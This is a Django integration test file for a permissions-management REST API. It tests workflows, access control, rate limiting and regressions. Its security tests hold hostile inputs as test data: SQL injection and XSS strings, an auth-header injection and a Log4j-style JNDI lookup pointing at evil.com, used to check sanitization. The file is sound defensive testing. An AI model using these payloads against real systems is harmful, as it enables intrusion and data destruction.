"""
T018: API Integration Testing - Permission Management System
Test Module: test_permission_api.py

Comprehensive integration tests for the User Permissions System API,
validating end-to-end workflows, security controls, and data integrity.
"""

import json
import time
from decimal import Decimal
from django.test import TransactionTestCase
from django.contrib.auth import get_user_model
from django.urls import reverse
from django.core.cache import cache
from django.db import transaction
from rest_framework.test import APITestCase, APIClient
from rest_framework import status
from unittest.mock import patch, Mock
import threading
from concurrent.futures import ThreadPoolExecutor
import pytest

from apps.core.models import (
    Permission, UserGroup, UserPermission, GroupPermission,
    GroupMembership, PermissionAuditLog
)
from apps.core.exceptions import (
    PermissionValidationError, PermissionConflictError,
    InsufficientPermissionsError, RateLimitExceededError
)

User = get_user_model()


class PermissionAPIIntegrationTestCase(APITestCase):
    """
    T018: Comprehensive permission API integration tests.
    
    Tests complete end-to-end workflows for permission management
    including security controls, authorization boundaries, and data consistency.
    """
    
    def setUp(self):
        """Set up test environment with comprehensive test data."""
        # Clear cache between tests
        cache.clear()
        
        # Create test users with different roles
        self.admin_user = User.objects.create_user(
            username='admin_test',
            email='admin@test.com',
            password='admin_pass_123',
            is_staff=True,
            is_superuser=True
        )
        
        self.manager_user = User.objects.create_user(
            username='manager_test',
            email='manager@test.com',
            password='manager_pass_123'
        )
        
        self.regular_user = User.objects.create_user(
            username='regular_test',
            email='regular@test.com',
            password='regular_pass_123'
        )
        
        self.inactive_user = User.objects.create_user(
            username='inactive_test',
            email='inactive@test.com',
            password='inactive_pass_123',
            is_active=False
        )
        
        # Create test permissions
        self.view_permission = Permission.objects.create(
            code='sales.order.view',
            name='View Sales Orders',
            description='Can view sales order information',
            module='sales',
            resource='order',
            action='view',
            risk_level='low'
        )
        
        self.create_permission = Permission.objects.create(
            code='sales.order.create',
            name='Create Sales Orders',
            description='Can create new sales orders',
            module='sales',
            resource='order',
            action='create',
            risk_level='medium'
        )
        
        self.critical_permission = Permission.objects.create(
            code='admin.system.configure',
            name='System Configuration',
            description='Can modify system configuration',
            module='admin',
            resource='system',
            action='configure',
            risk_level='critical'
        )
        
        # Create test groups
        self.sales_group = UserGroup.objects.create(
            name='Sales Team',
            description='Sales department users',
            is_active=True
        )
        
        self.admin_group = UserGroup.objects.create(
            name='System Administrators',
            description='System administrators with high privileges',
            is_active=True
        )
        
        # Set up API client
        self.client = APIClient()
        
        # Store original request counts for rate limiting tests
        self.original_rate_limits = {}
    
    def test_001_complete_permission_lifecycle_workflow(self):
        """
        T018-001: Test complete permission lifecycle from creation to deletion.
        
        Validates end-to-end workflow including:
        - Permission creation with validation
        - Assignment to users and groups
        - Permission checking and inheritance
        - Audit trail creation
        - Permission revocation and cleanup
        """
        self.client.force_authenticate(user=self.admin_user)
        
        # 1. Create new permission
        permission_data = {
            'code': 'inventory.product.manage',
            'name': 'Manage Products',
            'description': 'Full product management access',
            'module': 'inventory',
            'resource': 'product',
            'action': 'manage',
            'risk_level': 'high'
        }
        
        response = self.client.post(
            reverse('permission-list'),
            permission_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        permission_id = response.data['id']
        
        # Verify permission created correctly
        permission = Permission.objects.get(id=permission_id)
        self.assertEqual(permission.code, 'inventory.product.manage')
        self.assertEqual(permission.risk_level, 'high')
        
        # 2. Assign permission to user
        user_permission_data = {
            'user': self.manager_user.id,
            'permission': permission_id,
            'is_granted': True,
            'reason': 'Manager role assignment'
        }
        
        response = self.client.post(
            reverse('userpermission-list'),
            user_permission_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        
        # 3. Assign permission to group
        group_permission_data = {
            'group': self.sales_group.id,
            'permission': permission_id,
            'is_granted': True,
            'reason': 'Sales team access'
        }
        
        response = self.client.post(
            reverse('grouppermission-list'),
            group_permission_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        
        # 4. Add user to group (test inheritance)
        membership_data = {
            'user': self.regular_user.id,
            'group': self.sales_group.id
        }
        
        response = self.client.post(
            reverse('groupmembership-list'),
            membership_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        
        # 5. Test permission checking
        # Check direct user permission
        self.assertTrue(
            self.manager_user.has_permission_new('inventory.product.manage')
        )
        
        # Check inherited group permission
        self.assertTrue(
            self.regular_user.has_permission_new('inventory.product.manage')
        )
        
        # Check user without permission
        self.assertFalse(
            User.objects.create_user(
                username='no_perm_user',
                password='pass'
            ).has_permission_new('inventory.product.manage')
        )
        
        # 6. Verify audit trail creation
        audit_logs = PermissionAuditLog.objects.filter(
            resource_type='permission',
            resource_id=str(permission_id)
        )
        self.assertGreaterEqual(audit_logs.count(), 3)  # Create + 2 assignments
        
        # 7. Revoke permissions
        user_perm = UserPermission.objects.get(
            user=self.manager_user,
            permission=permission
        )
        response = self.client.patch(
            reverse('userpermission-detail', args=[user_perm.id]),
            {'is_granted': False},
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        # Verify revocation
        self.assertFalse(
            self.manager_user.has_permission_new('inventory.product.manage')
        )
        
        # 8. Clean up - delete permission (should fail with active assignments)
        response = self.client.delete(
            reverse('permission-detail', args=[permission_id])
        )
        # Should fail due to business rule validation
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # Remove all assignments first
        GroupPermission.objects.filter(permission=permission).update(is_granted=False)
        
        # Now deletion should succeed
        response = self.client.delete(
            reverse('permission-detail', args=[permission_id])
        )
        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)
    
    def test_002_api_security_controls_and_authorization(self):
        """
        T018-002: Test API security controls and authorization boundaries.
        
        Validates:
        - Authentication requirements
        - Permission-based access control
        - Input validation and sanitization
        - Authorization bypass prevention
        """
        # 1. Test unauthenticated access (should fail)
        self.client.force_authenticate(user=None)
        
        response = self.client.get(reverse('permission-list'))
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
        
        response = self.client.post(
            reverse('permission-list'),
            {'code': 'test.perm', 'name': 'Test'},
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_401_UNAUTHORIZED)
        
        # 2. Test insufficient permissions (regular user accessing admin functions)
        self.client.force_authenticate(user=self.regular_user)
        
        # Regular user shouldn't be able to create permissions
        response = self.client.post(
            reverse('permission-list'),
            {'code': 'test.perm', 'name': 'Test'},
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        
        # 3. Test input validation and sanitization
        self.client.force_authenticate(user=self.admin_user)
        
        # Test SQL injection attempt
        malicious_data = {
            'code': 'test.perm\'; DROP TABLE core_permission; --',
            'name': 'Malicious Permission',
            'risk_level': 'low'
        }
        
        response = self.client.post(
            reverse('permission-list'),
            malicious_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        self.assertIn('invalid characters', response.data['code'][0].lower())
        
        # Test XSS attempt
        xss_data = {
            'code': 'test.xss.attempt',
            'name': '<script>alert("XSS")</script>Test Permission',
            'description': '<img src=x onerror=alert("XSS")>',
            'risk_level': 'low'
        }
        
        response = self.client.post(
            reverse('permission-list'),
            xss_data,
            format='json'
        )
        # Should create but sanitize the input
        if response.status_code == status.HTTP_201_CREATED:
            # Verify XSS was sanitized
            permission = Permission.objects.get(id=response.data['id'])
            self.assertNotIn('<script>', permission.name)
            self.assertNotIn('<img', permission.description or '')
        
        # 4. Test parameter tampering
        # Try to assign permission to inactive user
        user_permission_data = {
            'user': self.inactive_user.id,
            'permission': self.view_permission.id,
            'is_granted': True
        }
        
        response = self.client.post(
            reverse('userpermission-list'),
            user_permission_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # 5. Test authorization bypass prevention
        # Try to escalate permissions through group manipulation
        # Create high-privilege group first
        high_priv_group = UserGroup.objects.create(
            name='High Privilege Test',
            is_active=True
        )
        
        GroupPermission.objects.create(
            group=high_priv_group,
            permission=self.critical_permission,
            is_granted=True,
            granted_by=self.admin_user
        )
        
        # Regular user shouldn't be able to add themselves to high-privilege group
        self.client.force_authenticate(user=self.regular_user)
        
        response = self.client.post(
            reverse('groupmembership-list'),
            {
                'user': self.regular_user.id,
                'group': high_priv_group.id
            },
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
    
    def test_003_api_performance_under_load(self):
        """
        T018-003: Test API performance under load conditions.
        
        Validates:
        - Response time requirements (<200ms for permission checks)
        - Concurrent request handling
        - Cache effectiveness
        - Database query optimization
        """
        self.client.force_authenticate(user=self.admin_user)
        
        # Create test data for performance testing
        permissions = []
        for i in range(50):
            perm = Permission.objects.create(
                code=f'test.perf.{i}',
                name=f'Performance Test Permission {i}',
                risk_level='low'
            )
            permissions.append(perm)
        
        # Grant some permissions to test user
        for perm in permissions[:25]:
            UserPermission.objects.create(
                user=self.manager_user,
                permission=perm,
                is_granted=True,
                granted_by=self.admin_user
            )
        
        # 1. Test single permission check performance
        start_time = time.time()
        
        for _ in range(100):
            self.manager_user.has_permission_new('test.perf.1')
        
        end_time = time.time()
        avg_time = (end_time - start_time) / 100
        
        # Should be under 5ms per check (with caching)
        self.assertLess(avg_time, 0.005, "Permission check too slow")
        
        # 2. Test API endpoint performance
        start_time = time.time()
        
        response = self.client.get(reverse('permission-list'))
        
        end_time = time.time()
        response_time = end_time - start_time
        
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertLess(response_time, 0.2, "API response too slow")
        
        # 3. Test concurrent request handling
        def make_concurrent_request():
            client = APIClient()
            client.force_authenticate(user=self.admin_user)
            return client.get(reverse('permission-list'))
        
        # Execute 20 concurrent requests
        with ThreadPoolExecutor(max_workers=20) as executor:
            start_time = time.time()
            futures = [executor.submit(make_concurrent_request) for _ in range(20)]
            responses = [future.result() for future in futures]
            end_time = time.time()
        
        # All requests should succeed
        for response in responses:
            self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        # Total time should be reasonable (not linear with request count)
        total_time = end_time - start_time
        self.assertLess(total_time, 5.0, "Concurrent handling too slow")
        
        # 4. Test cache effectiveness
        cache.clear()
        
        # First call (cache miss)
        start_time = time.time()
        self.manager_user.has_permission_new('test.perf.1')
        first_call_time = time.time() - start_time
        
        # Second call (cache hit)
        start_time = time.time()
        self.manager_user.has_permission_new('test.perf.1')
        second_call_time = time.time() - start_time
        
        # Cache hit should be significantly faster
        self.assertLess(
            second_call_time, 
            first_call_time * 0.5,
            "Cache not effective"
        )
    
    def test_004_cross_endpoint_data_consistency(self):
        """
        T018-004: Test cross-endpoint data consistency and transaction integrity.
        
        Validates:
        - ACID properties in permission operations
        - Data consistency across related endpoints
        - Rollback behavior on errors
        - Concurrent modification handling
        """
        self.client.force_authenticate(user=self.admin_user)
        
        # 1. Test transaction rollback on error
        permission_data = {
            'code': 'test.transaction.rollback',
            'name': 'Transaction Test Permission',
            'risk_level': 'low'
        }
        
        response = self.client.post(
            reverse('permission-list'),
            permission_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        permission_id = response.data['id']
        
        # Try to create duplicate (should fail and not affect existing)
        duplicate_data = permission_data.copy()
        
        response = self.client.post(
            reverse('permission-list'),
            duplicate_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # Verify original permission still exists
        self.assertTrue(
            Permission.objects.filter(id=permission_id).exists()
        )
        
        # 2. Test data consistency across endpoints
        # Create permission assignment
        user_perm_data = {
            'user': self.manager_user.id,
            'permission': permission_id,
            'is_granted': True
        }
        
        response = self.client.post(
            reverse('userpermission-list'),
            user_perm_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_201_CREATED)
        assignment_id = response.data['id']
        
        # Verify consistency across different endpoints
        # 1. Direct assignment endpoint
        response = self.client.get(
            reverse('userpermission-detail', args=[assignment_id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        self.assertTrue(response.data['is_granted'])
        
        # 2. User permissions endpoint
        response = self.client.get(
            reverse('user-permissions', args=[self.manager_user.id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        permission_codes = [p['permission']['code'] for p in response.data]
        self.assertIn('test.transaction.rollback', permission_codes)
        
        # 3. Permission assignments endpoint
        response = self.client.get(
            reverse('permission-assignments', args=[permission_id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        user_ids = [a['user']['id'] for a in response.data['user_assignments']]
        self.assertIn(self.manager_user.id, user_ids)
        
        # 3. Test concurrent modification handling
        def concurrent_permission_update():
            client = APIClient()
            client.force_authenticate(user=self.admin_user)
            return client.patch(
                reverse('userpermission-detail', args=[assignment_id]),
                {'reason': f'Updated by thread {threading.current_thread().ident}'},
                format='json'
            )
        
        # Execute concurrent updates
        with ThreadPoolExecutor(max_workers=5) as executor:
            futures = [executor.submit(concurrent_permission_update) for _ in range(5)]
            responses = [future.result() for future in futures]
        
        # At least one should succeed
        success_count = sum(1 for r in responses if r.status_code == status.HTTP_200_OK)
        self.assertGreaterEqual(success_count, 1)
        
        # Verify final state is consistent
        response = self.client.get(
            reverse('userpermission-detail', args=[assignment_id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        # Reason should be updated (by one of the concurrent requests)
        self.assertIsNotNone(response.data['reason'])
        
        # 4. Test cascade operations
        # Delete permission should handle related assignments properly
        response = self.client.delete(
            reverse('permission-detail', args=[permission_id])
        )
        
        # Should fail due to active assignments (business rule)
        self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # Revoke assignment first
        response = self.client.patch(
            reverse('userpermission-detail', args=[assignment_id]),
            {'is_granted': False},
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        # Now deletion should succeed
        response = self.client.delete(
            reverse('permission-detail', args=[permission_id])
        )
        self.assertEqual(response.status_code, status.HTTP_204_NO_CONTENT)
        
        # Verify assignment is also cleaned up appropriately
        response = self.client.get(
            reverse('userpermission-detail', args=[assignment_id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        # Assignment should still exist but with is_granted=False
        self.assertFalse(response.data['is_granted'])
    
    def test_005_security_authorization_bypass_attempts(self):
        """
        T018-005: Test security against authorization bypass attempts.
        
        Validates:
        - IDOR (Insecure Direct Object Reference) protection
        - Privilege escalation prevention
        - Mass assignment protection
        - Authentication bypass prevention
        """
        # 1. Test IDOR protection
        # Create a permission assigned to manager_user
        test_permission = Permission.objects.create(
            code='test.idor.protection',
            name='IDOR Test Permission',
            risk_level='medium'
        )
        
        manager_assignment = UserPermission.objects.create(
            user=self.manager_user,
            permission=test_permission,
            is_granted=True,
            granted_by=self.admin_user
        )
        
        # Regular user tries to access manager's permission assignment
        self.client.force_authenticate(user=self.regular_user)
        
        response = self.client.get(
            reverse('userpermission-detail', args=[manager_assignment.id])
        )
        # Should be forbidden or not found (depending on security model)
        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND])
        
        # Regular user tries to modify manager's permission
        response = self.client.patch(
            reverse('userpermission-detail', args=[manager_assignment.id]),
            {'is_granted': False},
            format='json'
        )
        self.assertIn(response.status_code, [status.HTTP_403_FORBIDDEN, status.HTTP_404_NOT_FOUND])
        
        # 2. Test privilege escalation prevention
        # Regular user tries to grant themselves admin permissions
        self.client.force_authenticate(user=self.regular_user)
        
        escalation_data = {
            'user': self.regular_user.id,
            'permission': self.critical_permission.id,
            'is_granted': True
        }
        
        response = self.client.post(
            reverse('userpermission-list'),
            escalation_data,
            format='json'
        )
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
        
        # 3. Test mass assignment protection
        self.client.force_authenticate(user=self.admin_user)
        
        # Try to create permission with protected fields
        mass_assignment_data = {
            'code': 'test.mass.assignment',
            'name': 'Mass Assignment Test',
            'risk_level': 'low',
            'id': 99999,  # Try to override ID
            'created_at': '2020-01-01T00:00:00Z',  # Try to override timestamp
            'is_system_permission': True  # Try to set internal flag
        }
        
        response = self.client.post(
            reverse('permission-list'),
            mass_assignment_data,
            format='json'
        )
        
        if response.status_code == status.HTTP_201_CREATED:
            # Verify protected fields were not set
            permission = Permission.objects.get(id=response.data['id'])
            self.assertNotEqual(permission.id, 99999)
            # created_at should be current time, not the provided value
            self.assertNotEqual(
                permission.created_at.strftime('%Y-%m-%d'),
                '2020-01-01'
            )
        
        # 4. Test authentication bypass attempts
        self.client.force_authenticate(user=None)
        
        # Try various authentication bypass techniques
        bypass_attempts = [
            # No authentication
            {},
            # Invalid token
            {'HTTP_AUTHORIZATION': 'Bearer invalid_token'},
            # Malformed authorization header
            {'HTTP_AUTHORIZATION': 'Invalid header format'},
            # SQL injection in auth header
            {'HTTP_AUTHORIZATION': 'Bearer \'; OR 1=1; --'},
        ]
        
        for headers in bypass_attempts:
            response = self.client.get(
                reverse('permission-list'),
                **headers
            )
            self.assertEqual(
                response.status_code, 
                status.HTTP_401_UNAUTHORIZED,
                f"Authentication bypass successful with headers: {headers}"
            )
        
        # 5. Test session manipulation
        # Create valid session
        self.client.force_authenticate(user=self.regular_user)
        
        # Get session data
        session = self.client.session
        original_user_id = session.get('_auth_user_id')
        
        # Try to manipulate session to become admin
        session['_auth_user_id'] = str(self.admin_user.id)
        session.save()
        
        # Try to access admin endpoint
        response = self.client.post(
            reverse('permission-list'),
            {
                'code': 'test.session.manipulation',
                'name': 'Session Manipulation Test',
                'risk_level': 'low'
            },
            format='json'
        )
        
        # Should still be forbidden (proper authentication middleware should prevent this)
        self.assertEqual(response.status_code, status.HTTP_403_FORBIDDEN)
    
    def test_006_input_fuzzing_and_validation(self):
        """
        T018-006: Test input fuzzing and comprehensive validation.
        
        Validates:
        - Input sanitization effectiveness
        - Buffer overflow protection
        - Format string vulnerabilities
        - Edge case handling
        """
        self.client.force_authenticate(user=self.admin_user)
        
        # 1. Test extremely long inputs
        long_string = 'A' * 10000
        
        fuzzing_data = {
            'code': 'test.fuzzing.long',
            'name': long_string,
            'description': long_string,
            'risk_level': 'low'
        }
        
        response = self.client.post(
            reverse('permission-list'),
            fuzzing_data,
            format='json'
        )
        
        # Should handle gracefully (either reject or truncate)
        if response.status_code == status.HTTP_201_CREATED:
            permission = Permission.objects.get(id=response.data['id'])
            self.assertLessEqual(len(permission.name), 255)  # Database constraint
        elif response.status_code == status.HTTP_400_BAD_REQUEST:
            # Validation should provide clear error
            self.assertIn('name', response.data)
        
        # 2. Test special characters and encoding
        special_chars_tests = [
            'test.special.\x00null',  # Null byte
            'test.special.\n\r\t',     # Control chars
            'test.special.üñíçødé',    # Unicode
            'test.special.🚀🔒',       # Emojis
            'test.special.\'\"\\',     # Quotes and escapes
        ]
        
        for test_code in special_chars_tests:
            response = self.client.post(
                reverse('permission-list'),
                {
                    'code': test_code,
                    'name': f'Special chars test: {test_code}',
                    'risk_level': 'low'
                },
                format='json'
            )
            
            # Should either sanitize or reject
            if response.status_code == status.HTTP_201_CREATED:
                # Verify sanitization occurred if needed
                permission = Permission.objects.get(id=response.data['id'])
                self.assertNotIn('\x00', permission.code)  # Null bytes removed
            else:
                # Should provide clear validation error
                self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # 3. Test format string vulnerabilities
        format_strings = [
            '%s%s%s%s',
            '%x%x%x%x',
            '%n%n%n%n',
            '${jndi:ldap://evil.com/}',  # Log4j style
        ]
        
        for fmt_str in format_strings:
            response = self.client.post(
                reverse('permission-list'),
                {
                    'code': 'test.format.string',
                    'name': fmt_str,
                    'description': fmt_str,
                    'risk_level': 'low'
                },
                format='json'
            )
            
            # Should handle safely
            if response.status_code == status.HTTP_201_CREATED:
                permission = Permission.objects.get(id=response.data['id'])
                # Verify no format string interpretation occurred
                self.assertEqual(permission.name, fmt_str)  # Stored as literal
        
        # 4. Test numeric edge cases
        numeric_tests = [
            {'user': -1, 'permission': self.view_permission.id},  # Negative ID
            {'user': 0, 'permission': self.view_permission.id},   # Zero ID
            {'user': 999999999, 'permission': self.view_permission.id},  # Large ID
            {'user': 'not_a_number', 'permission': self.view_permission.id},  # String instead of int
        ]
        
        for test_data in numeric_tests:
            response = self.client.post(
                reverse('userpermission-list'),
                test_data,
                format='json'
            )
            
            # Should properly validate and reject invalid IDs
            self.assertEqual(response.status_code, status.HTTP_400_BAD_REQUEST)
        
        # 5. Test JSON parsing edge cases
        malformed_json_tests = [
            '{"code": "test",}',  # Trailing comma
            '{"code": test"}',    # Missing quote
            '{"code": "test", "code": "duplicate"}',  # Duplicate key
            '{"code": "\u0000test"}',  # Unicode null
        ]
        
        for malformed_json in malformed_json_tests:
            response = self.client.post(
                reverse('permission-list'),
                malformed_json,
                content_type='application/json'
            )
            
            # Should handle parsing errors gracefully
            self.assertIn(
                response.status_code,
                [status.HTTP_400_BAD_REQUEST, status.HTTP_415_UNSUPPORTED_MEDIA_TYPE]
            )
    
    def test_007_rate_limiting_enforcement(self):
        """
        T018-007: Test rate limiting enforcement and proper headers.
        
        Validates:
        - Rate limit enforcement
        - Proper HTTP headers
        - Different limits for different user types
        - Rate limit bypass for trusted operations
        """
        # Clear any existing rate limit cache
        cache.clear()
        
        # 1. Test anonymous user rate limiting
        self.client.force_authenticate(user=None)
        
        # Make requests up to the limit
        responses = []
        for i in range(65):  # Exceed anonymous limit (60/min)
            response = self.client.get(reverse('health-check'))
            responses.append(response)
            
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        # Should eventually hit rate limit
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        self.assertGreater(len(rate_limited_responses), 0, "Rate limiting not enforced")
        
        # Check rate limit headers
        rate_limited_response = rate_limited_responses[0]
        self.assertIn('Retry-After', rate_limited_response)
        self.assertIn('X-RateLimit-Limit', rate_limited_response)
        self.assertIn('X-RateLimit-Remaining', rate_limited_response)
        
        # 2. Test authenticated user higher limits
        self.client.force_authenticate(user=self.regular_user)
        cache.clear()  # Clear rate limit cache
        
        # Authenticated users should have higher limits
        responses = []
        for i in range(310):  # Exceed authenticated limit (300/min)
            response = self.client.get(reverse('health-check'))
            responses.append(response)
            
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        # Should hit limit later than anonymous users
        rate_limited_responses = [r for r in responses if r.status_code == 429]
        success_responses = [r for r in responses if r.status_code == 200]
        
        # Should have more successful requests than anonymous limit
        self.assertGreater(len(success_responses), 60)
        
        # 3. Test admin user higher limits
        self.client.force_authenticate(user=self.admin_user)
        cache.clear()
        
        # Admin users should have even higher limits
        success_count = 0
        for i in range(510):  # Exceed admin limit (500/min)
            response = self.client.get(reverse('health-check'))
            if response.status_code == 200:
                success_count += 1
            elif response.status_code == 429:
                break
        
        # Admin should have more successful requests than regular users
        self.assertGreater(success_count, 300)
        
        # 4. Test different endpoints have different limits
        self.client.force_authenticate(user=self.regular_user)
        cache.clear()
        
        # Write operations should have lower limits
        write_responses = []
        for i in range(105):  # Exceed write limit (100/min)
            response = self.client.post(
                reverse('permission-list'),
                {
                    'code': f'test.rate.limit.{i}',
                    'name': f'Rate Limit Test {i}',
                    'risk_level': 'low'
                },
                format='json'
            )
            write_responses.append(response)
            
            if response.status_code == status.HTTP_429_TOO_MANY_REQUESTS:
                break
        
        # Should hit write limit before read limit
        write_success = [r for r in write_responses if r.status_code == 201]
        write_rate_limited = [r for r in write_responses if r.status_code == 429]
        
        self.assertGreater(len(write_rate_limited), 0, "Write rate limiting not enforced")
        self.assertLess(len(write_success), 300, "Write limit too high")
    
    def test_008_regression_prevention_validation(self):
        """
        T018-008: Test regression prevention for API breaking changes.
        
        Validates:
        - Response format consistency
        - Field presence and types
        - HTTP status code consistency
        - API versioning compliance
        """
        self.client.force_authenticate(user=self.admin_user)
        
        # 1. Test required response fields are present
        response = self.client.get(reverse('permission-list'))
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        # Check response structure
        self.assertIn('results', response.data)  # Paginated response
        self.assertIn('count', response.data)
        self.assertIn('next', response.data)
        self.assertIn('previous', response.data)
        
        if response.data['results']:
            permission = response.data['results'][0]
            required_fields = [
                'id', 'code', 'name', 'description', 'module',
                'resource', 'action', 'risk_level', 'is_active',
                'created_at', 'updated_at'
            ]
            
            for field in required_fields:
                self.assertIn(field, permission, f"Missing required field: {field}")
        
        # 2. Test field type consistency
        test_permission = Permission.objects.create(
            code='test.regression.types',
            name='Regression Test Permission',
            description='Test field types',
            risk_level='low'
        )
        
        response = self.client.get(
            reverse('permission-detail', args=[test_permission.id])
        )
        self.assertEqual(response.status_code, status.HTTP_200_OK)
        
        permission_data = response.data
        
        # Validate field types
        self.assertIsInstance(permission_data['id'], int)
        self.assertIsInstance(permission_data['code'], str)
        self.assertIsInstance(permission_data['name'], str)
        self.assertIsInstance(permission_data['is_active'], bool)
        self.assertIsInstance(permission_data['created_at'], str)  # ISO datetime string
        
        # 3. Test HTTP status code consistency
        status_code_tests = [
            # Successful operations
            ('GET', reverse('permission-list'), {}, 200),
            ('POST', reverse('permission-list'), {
                'code': 'test.status.codes',
                'name': 'Status Test',
                'risk_level': 'low'
            }, 201),
            
            # Client errors
            ('GET', reverse('permission-detail', args=[999999]), {}, 404),
            ('POST', reverse('permission-list'), {
                'code': '',  # Invalid data
                'name': '',
                'risk_level': 'invalid'
            }, 400),
        ]
        
        for method, url, data, expected_status in status_code_tests:
            if method == 'GET':
                response = self.client.get(url)
            elif method == 'POST':
                response = self.client.post(url, data, format='json')
            
            self.assertEqual(
                response.status_code,
                expected_status,
                f"Unexpected status for {method} {url}: got {response.status_code}, expected {expected_status}"
            )
        
        # 4. Test API versioning compliance
        # Endpoints should be under /api/v1/ namespace
        api_v1_endpoints = [
            'permission-list',
            'userpermission-list',
            'grouppermission-list',
            'usergroup-list',
            'groupmembership-list'
        ]
        
        for endpoint_name in api_v1_endpoints:
            url = reverse(endpoint_name)
            self.assertTrue(
                url.startswith('/api/v1/'),
                f"Endpoint {endpoint_name} not under API v1 namespace: {url}"
            )
        
        # 5. Test backward compatibility
        # Test that old field names/formats are still supported if applicable
        legacy_permission_data = {
            'code': 'test.legacy.format',
            'name': 'Legacy Format Test',
            'risk_level': 'low',
            # Include any legacy fields that should still be supported
        }
        
        response = self.client.post(
            reverse('permission-list'),
            legacy_permission_data,
            format='json'
        )
        
        # Should still work (or provide clear migration guidance)
        self.assertIn(
            response.status_code,
            [status.HTTP_201_CREATED, status.HTTP_400_BAD_REQUEST]
        )
        
        if response.status_code == status.HTTP_400_BAD_REQUEST:
            # Error should provide migration guidance
            self.assertIsInstance(response.data, dict)
            # Should have helpful error messages
            for field, errors in response.data.items():
                if isinstance(errors, list):
                    self.assertTrue(
                        any(isinstance(error, str) for error in errors),
                        f"Non-string error in field {field}"
                    )
    
    def tearDown(self):
        """Clean up after each test."""
        cache.clear()
        super().tearDown()